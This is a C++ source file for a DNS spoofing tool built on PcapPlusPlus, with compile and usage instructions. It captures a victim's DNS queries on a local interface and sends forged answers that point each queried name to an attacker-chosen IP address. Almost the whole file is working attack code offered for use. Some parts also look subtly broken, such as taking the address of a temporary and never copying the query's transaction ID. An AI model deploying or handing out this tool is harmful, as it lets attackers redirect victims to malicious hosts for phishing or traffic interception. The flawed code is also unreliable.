// ============================================================
// dns_spoof.cpp — forge DNS responses
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o dns_spoof dns_spoof.cpp \
//          -I/opt/homebrew/include -L/opt/homebrew/lib \
//          -lPcap++ -lPacket++ -lCommon++ -lpcap
// Usage:   sudo ./dns_spoof <iface> <victim_ip> <spoof_ip>
// ============================================================
#include "PcapLiveDeviceList.h"
#include "DnsLayer.h"
#include "IPv4Layer.h"
#include "UdpLayer.h"
#include "EthLayer.h"
#include "Packet.h"
#include <cstdio>
#include <cstring>

int main(int argc, char** argv) {
    if (argc < 4) return 1;
    auto* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(argv[1]);
    if (!dev || !dev->open()) return 1;

    pcpp::IPv4Address victim(argv[2]);
    pcpp::IPv4Address spoof(argv[3]);

    dev->startCapture([](pcpp::RawPacket* raw, pcpp::PcapLiveDevice* d, void* cookie) {
        auto* args = static_cast<std::pair<pcpp::IPv4Address, pcpp::IPv4Address>*>(cookie);
        pcpp::Packet pkt(raw);
        auto* dns = pkt.getLayerOfType<pcpp::DnsLayer>();
        auto* udp = pkt.getLayerOfType<pcpp::UdpLayer>();
        auto* ip  = pkt.getLayerOfType<pcpp::IPv4Layer>();
        if (!dns || !udp || !ip) return;
        if (dns->getDnsHeader()->queryOrResponse != 0) return;
        if (ip->getSrcIPv4Address() != args->first) return;

        auto* q = dns->getFirstQuery();
        if (!q) return;

        pcpp::EthLayer eth(d->getMacAddress(), pcpp::MacAddress("ff:ff:ff:ff:ff:ff"), PCPP_ETHERTYPE_IP);
        pcpp::IPv4Layer ipL(ip->getDstIPv4Address(), ip->getSrcIPv4Address());
        ipL.getIPv4Header()->protocol = pcpp::IPProtocolTypes::PACKETPP_IPPROTO_UDP;
        pcpp::UdpLayer udpL(udp->getDstPort(), udp->getSrcPort());
        pcpp::DnsLayer dnsL;
        dnsL.addQuery(q->getName(), q->getDnsType(), q->getDnsClass());
        dnsL.addAnswer(q->getName(), q->getDnsType(), q->getDnsClass(), 60, args->second.toString(), pcpp::DNS_TYPE_A);

        pcpp::Packet resp(100);
        resp.addLayer(&eth); resp.addLayer(&ipL);
        resp.addLayer(&udpL); resp.addLayer(&dnsL);
        resp.computeCalculateFields();
        d->sendPacket(&resp);
        std::printf("[+] spoofed %s -> %s\n", q->getName().c_str(), args->second.toString().c_str());
    }, &std::make_pair(victim, spoof));

    while (true) sleep(1);
    return 0;
}
